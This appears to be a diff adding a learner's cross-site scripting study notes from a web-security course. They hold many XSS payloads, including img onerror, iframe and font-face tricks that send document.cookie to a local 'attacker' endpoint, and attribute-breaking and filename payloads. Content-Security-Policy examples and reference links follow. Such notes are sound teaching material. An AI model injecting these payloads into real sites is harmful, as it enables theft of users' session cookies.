@@ -1,0 +1,124 @@
+<img src="http://localhost:3000/api/xss?cookie='sss'" /> won't work
+
+
+<img src="x" onerror="fetch('http://localhost:3000/api/xss?cookie='+document.cookie)">
+
+Stealing cookies from user machine:
+
+<img src="x" onerror="fetch('http://localhost:3000/api/xss?cookie='+encodeURIComponent(document.cookie))">
+I can get the cookie of victims machine to attackers machine
+
+Execute scripts through styles:
+    That's why fonts not allowed in CORS
+    <style>
+    @font-face {
+    font-family: xss;
+    src: url('http://localhost:3000/api/xss?message=XssInFonts');
+    }
+    span {font-family: xss}
+    </style>
+
+
+
+Hit api via iframe:
+    <iframe src="javascript:fetch('http://localhost:3000/api/xss?cookie='+encodeURIComponent(document.cookie))"></iframe>
+
+
+How attacker will send these scripts to victims machine???
+
+
+Level 4 - 4th App of Xss 
+3types of XSS;
+    1. Reflected XSS
+    2. Stored XSS
+    3. DOM Based XSS
+
+    Welcome to session
+
+<h1>Sunny</h1>
+
+<marquee>Sunny</marquee>
+
+<script>alert(1)</script>
+
+<script>(alert)(1)</script>
+
+<script>alert(document.cookie)</script>
+
+<img src="x" onerror="window.location.href='https://devkode.io'">
+
+<a href="https://devkode.io">Devkode</a>
+
+<img src="https://devkode.io/img/devkode-logo.svg">
+
+Copy paste svg code from devkode logo image.
+
+<iframe src="https://devkode.io" height="600" width="1000">
+
+<style type="text/css">body{background:red;}</style>
+
+Note: Explain document.write with loading and unloading state
+
+<img src="http://localhost:3000/api/xss?message=Hello"></img>
+
+<script>
+  var payload = encodeURIComponent(document.cookie);
+  var image = new Image();
+  image.src = 'http://localhost:3000/api/xss?message=Hello';
+</script>
+
+
+Day - 4
+
+Example -5 or Level 5
+http://localhost:3000/5/#sunny'%20onerror=%22alert(fetch('http://localhost:3000/api/xss?cookie='+document.cookie))%22
+
+http://localhost:3000/5/#1.png' onload="alert(4)"
+
+Level-6 or Example 6
+devkode' onload="alert(3)"
+
+6th Ex;
+'> <img src="x" onerror="alert(3)">
+'> <img src="x" onerror="fetch('http://localhost:3000/api/xss?cookie='+document.cookie)">
+
+7th Example
+<img src="x" onerror="alert()">.svg
+<img src="x" onerror="alert(document.cookie)">.svg
+
+8th Example
+' onerror='alert()
+
+Such file names are not allowed in windows may be
+
+CSP:
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'" />
+
+<meta
+      http-equiv="Content-Security-Policy"
+      content="default-src 'self';
+      script-src 'self' 'sha256-Nyr8Xo7ZgA0DFvK0dz/9z6BGLqYdjRD22K5gMbIXM5c=' 'sha256-zqo90DGvWHXPxG4YJMv07S8sCsm70GWDp7YVlqSBTBE=';
+      style-src 'self' fonts.googleapis.com 'sha256-u6mziMipbJIhazSGTyVETD+fwkbojr9kJFWO94sslQI=';
+      font-src 'self' data: fonts.gstatic.com;
+      img-src 'self' devkode.io;
+      frame-src https://devkode.io"
+    />
+
+
+OAuth: https://www.youtube.com/watch?v=996OiexHze0
+
+RPCs: Protobuff, Remote Procedure Call
+gRPC
+
+
+https://docs.google.com/forms/d/e/1FAIpQLSdmPCpfn0j7TEajqsplL5hE2fAtug7X98EsPSjPXos7N0WyPA/viewform
+
+
+
+https://docs.google.com/document/d/1p4q4GyagYQcdOVqdWtP_FCr2sRp53QKRS2U6bmLXLVg/edit
+
+
+https://stackoverflow.com/questions/9153445/how-to-communicate-between-iframe-and-the-parent-site
+
+
+https://samcurry.net/cracking-my-windshield-and-earning-10000-on-the-tesla-bug-bounty-program/
